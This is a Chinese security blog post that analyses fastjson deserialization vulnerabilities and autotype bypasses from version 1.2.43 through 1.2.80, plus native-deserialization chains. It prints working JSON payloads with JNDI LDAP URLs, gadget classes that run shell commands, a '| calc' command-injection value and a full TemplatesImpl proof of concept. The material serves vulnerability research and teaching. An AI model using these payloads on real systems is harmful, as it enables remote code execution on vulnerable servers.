-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行后报错希望43行为{</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023161826856.png" alt="image-20231023161826856"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>现在成功运行了</p>
-<p>分析下原因，先看下逗号前添加 “[“ 的逻辑</p>
-<p>在deserialze中先获取ComponentType型的数据，这个数据就是截取”[“后的实体类，接着调用parseArray进行解析</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023163713012.png" alt="image-20231023163713012"></p>
-<p>先获取token，如果值不是14就会抛出刚才的异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164100641.png" alt="image-20231023164100641"></p>
-<p>所以问题在于前边解析lexer中token的时候发生的，逻辑就在DefaultJSONParser中，lexer是fastjson中的一个词法解析器，它希望下一次解析内容为<code>JSONToken.COMMA</code>也就是逗号前的内容</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164600475.png" alt="image-20231023164600475"></p>
-<p>之后如果逗号前的内容是[，就会返回token值14，便不再会抛出异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023165046308.png" alt="image-20231023165046308"></p>
-<p>逗号前是”{“同理，逻辑在JavaBeanDeserializer#deserialze，可以自行分析下</p>
-<p>所以最终的payload为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但该漏洞在1.2.44修复了，修复方式仍然是黑名单抛异常</p>
-<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson -1.2.47"></a>fastjson -1.2.47</h2><p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞—Cache通杀，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
-<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code></p>
-<p>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p>
-<p>autotype：1.2.32前关闭，1.2.33—1.2.47均可</p>
-<p>到此黑名单已经设置的比较严格了，在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，没有其它的绕过方式，于是思路就转变到了在判断autoTypeSupport 前找调用链</p>
-<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>autoTypeSupport 前有两个可以加载类的部分，分别是从mappings缓存和deserializers中获取</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023180320857.png" alt="image-20231023180320857"></p>
-<p>先看下deserializers是否可控，它是一个IdentityHashMap对象，对其进行赋值的函数有</p>
-<ul>
-<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
-<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
-<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
-</ul>
-<p>因此就无法通过修改deserializers的方式获取类了，接着看哪里能赋值<code>mappings</code>，于是找到了TypeUtils的loadClass，当cache为true时就会将传入的className存储到mappings中</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181153428.png" alt="image-20231023181153428"></p>
-<p>而在MiscCodec的deserialze有对应的调用，会把strVal存入mappings中</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181457849.png" alt="image-20231023181457849"></p>
-<p>所以接下来的任务就是：</p>
-<ol>
-<li>找到某个类调用MiscCodec#deserialze</li>
-<li>判断strVal是否可控</li>
-</ol>
-<h4 id="MiscCodec-deserialze"><a href="#MiscCodec-deserialze" class="headerlink" title="MiscCodec#deserialze"></a>MiscCodec#deserialze</h4><p>在fastjson执行反序列化前，会调用<code>getDeserializer()</code>寻找适合的反序列化器</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182235940.png" alt="image-20231023182235940"></p>
-<p>而反序列化器是从deserializers获取的，deserializers又在初始化中添加了MiscCodec这个类，所以只需要我们传入的类为Class.class即可，即：<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;a&quot;:&quot;aaa&quot;&#125;</code></p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182407922.png" alt="image-20231023182407922"></p>
-<h4 id="strVal"><a href="#strVal" class="headerlink" title="strVal"></a>strVal</h4><p>strVal的值是objVal赋过去的，而objVal的值则是解析json中的val属性的值</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023183156083.png" alt="image-20231023183156083"></p>
-<p>现在这样就能将JdbcRowSetImpl类存到mappings中</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于fastjson是循环解析json数据，所以只需要在构造一段触发恶意类的json数据即可，payload：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">		<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">		<span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">		<span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-32"><a href="#1-2-32" class="headerlink" title="1.2.32"></a>1.2.32</h3><p>1.2.32前需要关闭autotype才能执行，原因在于自1.2.33开始，当开启autotype之后，进行黑名单检测时如果检测到黑名单类并不会直接抛出异常，而是还会从mappings缓存中查找，如果都没有才会抛出异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023185727882.png" alt="image-20231023185727882"></p>
-<p>而在1.2.32中没有该逻辑，如果匹配到黑名单则直接抛出异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023190033359.png" alt="image-20231023190033359"></p>
-<h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson -1.2.68"></a>fastjson -1.2.68</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.68</p>
-<p>autotype：均可</p>
-<p>在1.2.47之后，官方把MiscCodec中调用loadClass的地方cache默认设为了false，并且TypeUtils的loadClass也默认设为了false，cache加载恶意类的方式便不再适用</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231024135921385.png" alt="image-20231024135921385"></p>
-<p>在1.2.68中又提出了一个新的 autoType 绕过思路：利用 expectClass 绕过 <code>checkAutoType()</code>。</p>
-<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>所以接下来就需要寻找哪里调用<code>checkAutoType()</code>，并且调用时有expectClass作为入参，最终找到了这两个类</p>
-<ul>
-<li><p><code>ThrowableDeserializer#deserialze()</code></p>
-</li>
-<li><p><code>JavaBeanDeserializer#deserialze()</code></p>
-</li>
-</ul>
-<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>expectClass入参为Throwable</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025151432003.png" alt="image-20231025151432003"></p>
-<p>如果传入的类是Throwable的子类或者实现类，就可以绕过checkAutoType检测，获取class</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152333512.png" alt="image-20231025152333512"></p>
-<p>并且由于是Throwable的子类，在<code>getDeserializer()</code>获取反序列化器时，也能拿到ThrowableDeserialize反序列化器，最终出发对应的ThrowableDeserializer#deserialze()</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152611523.png" alt="image-20231025152611523"></p>
-<p>gadget</p>
-<p>Exception是Throwable的子类</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>poc</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecException&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>在<code>getDeserializer()</code>获取反序列化器时，如果找不到合适的反序列化器,会调用最后的<code>createJavaBeanDeserializer()</code>，创建JavaBeanDeserializer进行反序列化</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153147913.png" alt="image-20231025153147913"></p>
-<p>在TypeUtils#addBaseClassMappings(),发现白名单中有个AutoCloseable，经调试他会获取JavaBeanDeserializer反序列化器</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153311274.png" alt="image-20231025153311274"></p>
-<p>而他的expectClass是可控的，就是在经过的ParserConfig#checkAutoType后得到的clazz值，而如果我们传入</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到的expectClass就是<code>java.lang.AutoCloseable</code></p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153904376.png" alt="image-20231025153904376"></p>
-<p>所以就可以构造，实现java.lang.AutoCloseable接口的子类可以绕过autotype反序列化</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Closeable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecCloseable</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>poc</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>fastjson在后续版本中将java.lang.Runnable、java.lang.Readable加入了黑名单，经测试这些类也是可以触发的，不过像这种把命令执行写到异常类的处理方式未免有些鸡肋，在实际开发场景中一般不会碰见，并且自1.2.68开始由于加了这段代码，jndi等利用方式也不再适用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">        || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">        || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>于是浅蓝师傅提出了写文件拿shell方式，具体可参考</p>
-<p><a href="https://su18.org/post/fastjson-1.2.68/">Fastjson 68 commons-io AutoCloseable </a></p>
-<h2 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson -1.2.80"></a>fastjson -1.2.80</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.80</p>
-<p>autotype：均可</p>
-<p>1.2.69开始，将AutoCloseable以hash的形式又又又又加入了黑名单，如果使用AutoCloseable，expectClassFlag的值会变为false，若此时默认关闭autotype功能则无法加载继承AutoCloseable的恶意类，这条路便无法走通了</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025164310188.png" alt="image-20231025164310188"></p>
-<p>但这次黑名单中并没有将Throwable加入黑名单，所以expectClass入参为Throwable的方式仍然可用，除此外更具突破性的应该是师傅们挖掘的对于特殊依赖的利用链</p>
-<p>gadget:</p>
-<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
-<p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf</a></p>
-<p>1.2.83版本彻底将期望类ban掉了，并且在添加mapping缓存时也加了一层autotype判断</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182245454.png" alt="image-20231025182245454"></p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182400394.png" alt="image-20231025182400394"></p>
-<ol>
-<li><a href="https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d">https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d</a></li>
-<li><a href="https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15">https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15</a></li>
-</ol>
-<p>通过parseObject()触发利用的方式得到了暂时的修复，但通过fastjson 原生反序列化仍存在相应的利用绕过方式</p>
-<h1 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h1><h2 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson &lt; 1.2.49"></a>fastjson &lt; 1.2.49</h2><p>fastjson中有两个类实现了Serializable接口，分别是<code>JSONArray</code>和<code>JSONObject</code>，并且他们都继承于JSON类</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114131702.png" alt="image-20231026114131702"></p>
-<p>而在JSON类中，有一个toString方法，会调用toJSONString()，toJSONString()又会调用指定类的getter方法</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114410826.png" alt="image-20231026114410826"></p>
-<p>但fastjson组件中没有重写<code>readObject()</code>，所以就要借助其它类的readObject类进行拼接，调用toString直接可以想到现有的链BadAttributeValueExpException，整条调用链也就出来了</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject() —&gt; </span><br><span class="line">JSON.toString() —&gt;  </span><br><span class="line">TemplatesImpl.getOutputProperties() —&gt;  </span><br></pre></td></tr></table></figure>
-
-<p>POC:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(badAttributeValueExpException);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="fastjson-≥-1-2-49"><a href="#fastjson-≥-1-2-49" class="headerlink" title="fastjson ≥ 1.2.49"></a>fastjson ≥ 1.2.49</h2><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>自1.2.49开始，fastjson实现了自己的<code>readObject()</code>类，它定义了<code>SecureObjectInputStream()</code>方法</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027110540708.png" alt="image-20231027110540708"></p>
-<p>封装完secIn对象后，会调用到<code>secIn.defaultReadObject();</code>，会走到JSON类重写的<code>resolveClass()</code>方法，调用<code>checkAutoType()</code>方法进行黑名单检测，所以Templates加载字节码的方式就会被check掉</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027111426348.png" alt="image-20231027111426348"></p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>但这种方式并不是安全的，因为这里的反序列化过程是：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject -&gt; SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>
-
-<p>相当于在ObjectInputStream套了个SecureObjectInputStream进行检测</p>
-<p>而正常流程应该是生成一个继承ObjectInputStream的类并重写resolveClass，由它来做反序列化的入口，这样才是安全的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">继承类 -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>
-
-<p>既然这样，就需要考虑如何绕过<code>resolveClass()</code>解析，了解反序列化流程的话应该知道</p>
-<p><code>readObject0()</code>的switch语句中，会走到<code>TC_OBJECT</code>处理对象，调用<code>readOrdinaryObject()</code>，其中会调用<code>readClassDesc()</code>读取类描述符，最后调用<code>readNonProxyDesc()</code>，调用到<code>resolveClass()</code>，具体流程可以参考之前文章<a href="https://s1nja.github.io/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/">defaultReadObject分析 | S1nJa’s Blog</a></p>
